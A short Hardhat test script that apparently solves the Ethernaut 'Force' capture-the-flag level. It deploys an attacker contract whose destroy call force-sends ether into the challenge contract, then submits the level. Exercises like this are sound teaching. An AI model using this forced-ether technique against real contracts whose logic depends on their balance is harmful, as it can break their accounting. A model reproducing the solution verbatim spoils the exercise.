const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, challenge, attacker, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0xb6c2Ec883DaAac76D8922519E63f875c2ec65575")
    challenge = await ethers.getContractAt("Force", challengeAddress)

    const attackerFactory = await ethers.getContractFactory("ForceAttacker")
    attacker = await attackerFactory.deploy()
})

it("solves the challenge", async function () {
    console.log("Contract balance before: ", await ethers.provider.getBalance(challenge.address))

    tx = await attacker.destroy(challenge.address, { value: 1 })
    await tx.wait()

    console.log("Contract balance after: ", await ethers.provider.getBalance(challenge.address))
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
